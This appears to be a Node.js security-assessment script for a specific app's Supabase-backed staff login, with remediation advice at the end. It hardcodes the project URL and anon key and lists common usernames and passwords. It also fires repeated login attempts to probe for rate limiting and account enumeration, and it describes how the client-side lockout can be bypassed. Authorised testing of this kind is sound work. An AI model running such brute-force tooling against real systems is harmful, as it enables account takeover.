#!/usr/bin/env node

/**
 * Web Staff Login Brute Force Test
 * 
 * Targets the SHA-256-based authentication in web_auth_service.dart
 * WARNING: Only run against systems you own or have permission to test.
 */

import crypto from 'node:crypto';

// ============================================================
// CONFIGURATION — ADJUST THESE FOR YOUR TARGET
// ============================================================
const TARGET_URL = 'http://localhost:5000'; // Flutter web dev server or deployed URL
const SUPABASE_REST_URL = 'https://tgbfxepldpdswxehhlkx.supabase.co/rest/v1';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRnYmZ4ZXBsZHBkc3d4ZWhobGt4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA4NDYzMDcsImV4cCI6MjA4NjQyMjMwN30.DhoD6RHExKynXw34mibc3XRP-NwfmDnq1PttVM7-GL4';

// Test credentials - these are placeholders, replace with actual known test accounts
const TEST_USERNAMES = [
  'admin',
  'superadmin',
  'staff',
  'worker',
  'cswd_admin',
  'administrator',
  'root',
  'test',
  'user',
  'manager',
];

const COMMON_PASSWORDS = [
  'password',
  'password123',
  'admin',
  'admin123',
  '12345678',
  '123456789',
  'qwerty123',
  'letmein',
  'welcome',
  'Password1',
  'P@ssw0rd',
  'changeme',
  'test1234',
  'staff123',
  'cswd2025',
  'cswd2026',
  'sappiire',
  'SapPIIre',
  'secret',
  'default',
];

// ============================================================
// SHA-256 hash function (same as web_auth_service.dart)
// ============================================================
function sha256(password) {
  return crypto.createHash('sha256').update(password, 'utf-8').digest('hex');
}

// ============================================================
// BENCHMARK: Show how fast SHA-256 cracking is
// ============================================================
function benchmarkSha256() {
  console.log('\n══════════════════════════════════════════════');
  console.log('  SHA-256 HASH SPEED BENCHMARK');
  console.log('══════════════════════════════════════════════');
  
  const sample = 'test_password_123!';
  const iterations = 100000;
  
  const start = process.hrtime.bigint();
  for (let i = 0; i < iterations; i++) {
    sha256(sample + i);
  }
  const end = process.hrtime.bigint();
  
  const elapsedMs = Number(end - start) / 1_000_000;
  const hashesPerSec = Math.round(iterations / (elapsedMs / 1000));
  
  console.log(`  ${iterations.toLocaleString()} hashes in ${elapsedMs.toFixed(2)}ms`);
  console.log(`  ~${hashesPerSec.toLocaleString()} hashes/second (Node.js — single thread)`);
  console.log(`  ~${(hashesPerSec * 8).toLocaleString()} hashes/second (8-core estimate)`);
  console.log(`  Time to crack rockyou.txt (14M passwords):`);
  console.log(`    Single thread: ${(14_000_000 / hashesPerSec / 60).toFixed(1)} minutes`);
  console.log(`    8 cores:       ${(14_000_000 / (hashesPerSec * 8) / 60).toFixed(1)} minutes`);
  console.log(`  ⚠️  GPU (Hashcat) would be 100-1000x faster!`);
  console.log('');
}

// ============================================================
// TEST 1: Direct Supabase REST API brute force
// ============================================================
async function testDirectSupabaseLogin(username, password) {
  try {
    // Try to query staff_accounts directly (will likely be blocked by RLS)
    const response = await fetch(`${SUPABASE_REST_URL}/staff_accounts`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Prefer': 'return=minimal',
      },
      body: JSON.stringify({
        // This is a login attempt, not a direct query
      }),
    });
    return { status: response.status, blocked: response.status === 401 || response.status === 403 };
  } catch (e) {
    return { status: 0, blocked: true, error: e.message };
  }
}

// ============================================================
// TEST 2: Simulate the web_auth_service.dart login flow
// This tests the actual authentication path used by the app
// ============================================================
async function testWebAuthFlow(username, password) {
  const hashedPassword = sha256(password);
  
  try {
    // This is what web_auth_service.dart does:
    // 1. Try superadmin role first with username
    let response = await fetch(`${SUPABASE_REST_URL}/staff_accounts`, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
      },
    });
    
    // The actual app uses the supabase client which handles auth differently
    // We need to test through the actual app endpoints
    return { tested: false, note: 'Direct API access blocked by RLS — need app-level test' };
  } catch (e) {
    return { tested: false, error: e.message };
  }
}

// ============================================================
// TEST 3: Brute force the Supabase Auth sign-in endpoint
// ============================================================
async function testSupabaseAuthLogin(email, password) {
  try {
    const response = await fetch(
      `https://tgbfxepldpdswxehhlkx.supabase.co/auth/v1/token?grant_type=password`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'apikey': SUPABASE_ANON_KEY,
        },
        body: JSON.stringify({
          email: email,
          password: password,
        }),
      }
    );
    
    const data = await response.json();
    return {
      status: response.status,
      success: !!data.access_token,
      error: data.error_description || data.error || null,
    };
  } catch (e) {
    return { status: 0, success: false, error: e.message };
  }
}

// ============================================================
// TEST 4: Check for rate limiting on auth endpoint
// ============================================================
async function testRateLimiting() {
  console.log('\n══════════════════════════════════════════════');
  console.log('  RATE LIMITING TEST');
  console.log('══════════════════════════════════════════════');
  
  const testEmail = 'nonexistent@test.com';
  let consecutiveSuccess = 0;
  let rateLimited = false;
  
  for (let i = 0; i < 20; i++) {
    const result = await testSupabaseAuthLogin(testEmail, `password${i}`);
    
    if (result.status === 429) {
      console.log(`  ✅ Rate limiting detected at attempt ${i + 1}: HTTP 429`);
      rateLimited = true;
      break;
    } else if (result.status === 400) {
      const msg = result.error || '';
      if (msg.toLowerCase().includes('rate') || msg.toLowerCase().includes('too many')) {
        console.log(`  ✅ Rate limiting detected at attempt ${i + 1}: ${msg}`);
        rateLimited = true;
        break;
      }
      consecutiveSuccess++;
    } else {
      consecutiveSuccess++;
    }
    
    // Small delay to be respectful
    await new Promise(r => setTimeout(r, 100));
  }
  
  if (!rateLimited) {
    console.log(`  ❌ NO RATE LIMITING DETECTED after ${consecutiveSuccess} rapid attempts`);
    console.log('  ⚠️  This means unlimited brute force attempts are possible!');
  }
  
  return !rateLimited;
}

// ============================================================
// TEST 5: Check if superadmin accounts are enumerable
// ============================================================
async function testUserEnumeration() {
  console.log('\n══════════════════════════════════════════════');
  console.log('  USER ENUMERATION TEST');
  console.log('══════════════════════════════════════════════');
  
  for (const username of TEST_USERNAMES.slice(0, 5)) {
    const result = await testSupabaseAuthLogin(`${username}@test.com`, 'wrongpassword');
    console.log(`  [${username}] Status: ${result.status}, Error: ${result.error || 'none'}`);
    
    // Check if we can distinguish "user exists" from "user doesn't exist"
    // This is a classic enumeration vulnerability
  }
}

// ============================================================
// TEST 6: Simulate mobile login rate limit bypass
// The mobile app has client-side rate limiting that can be bypassed
// ============================================================
function testMobileRateLimitBypass() {
  console.log('\n══════════════════════════════════════════════');
  console.log('  MOBILE LOGIN RATE LIMIT BYPASS (CLIENT-SIDE)');
  console.log('══════════════════════════════════════════════');
  
  console.log('  The mobile app implements rate limiting at:');
  console.log('  lib/services/supabase_service.dart lines 615-618');
  console.log('  ┌─────────────────────────────────────────────────────┐');
  console.log('  │  static final Map<String, int> _failedAttempts = {}; │');
  console.log('  │  static final Map<String, DateTime> _lockoutUntil = {}; │');
  console.log('  │  static const int _maxAttempts = 5;                │');
  console.log('  │  static const Duration _lockoutDuration = 5 min;   │');
  console.log('  └─────────────────────────────────────────────────────┘');
  console.log('');
  console.log('  ⚠️  THIS IS CLIENT-SIDE ONLY — Can be bypassed by:');
  console.log('    1. Restarting the app (clears in-memory maps)');
  console.log('    2. Using multiple devices');
  console.log('    3. Modifying the client code');
  console.log('    4. Direct API calls (bypassing the app entirely)');
  console.log('    5. Clearing app data');
  console.log('');
  console.log('  ✅ Since Supabase Auth is the real backend, rate limiting');
  console.log('     depends on Supabase server-side configuration.');
  console.log('     Testing server-side rate limit in Test 3.');
}

// ============================================================
// MAIN
// ============================================================
async function main() {
  console.log('');
  console.log('██████╗ ██████╗ ██╗   ██╗████████╗███████╗');
  console.log('██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝');
  console.log('██████╔╝██████╔╝██║   ██║   ██║   █████╗  ');
  console.log('██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ');
  console.log('██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗');
  console.log('╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝');
  console.log('  FORCE TEST — SapPIIre Security Assessment');
  console.log('==============================================');
  
  // Test 0: Benchmark
  benchmarkSha256();
  
  // Test 1: Rate limiting
  const noRateLimit = await testRateLimiting();
  
  // Test 2: User enumeration
  await testUserEnumeration();
  
  // Test 3: Mobile bypass
  testMobileRateLimitBypass();
  
  // Summary
  console.log('\n══════════════════════════════════════════════');
  console.log('  RESULTS SUMMARY');
  console.log('══════════════════════════════════════════════');
  
  if (noRateLimit) {
    console.log('  ❌ CRITICAL: No server-side rate limiting detected!');
    console.log('  🔴 The web staff login is vulnerable to brute force attacks.');
    console.log('  🔴 SHA-256 hashing (not bcrypt/argon2) makes cracking fast.');
  } else {
    console.log('  ✅ Server-side rate limiting is active.');
  }
  
  console.log('\n  RECOMMENDED ACTIONS:');
  console.log('  1. Replace SHA-256 with bcrypt in web_auth_service.dart');
  console.log('  2. Add server-side rate limiting (Edge Function or Supabase RLS)');
  console.log('  3. Move mobile rate limiting to server-side');
  console.log('  4. Add account lockout with exponential backoff');
  console.log('  5. Implement CAPTCHA after N failed attempts');
  console.log('');
}

main().catch(console.error);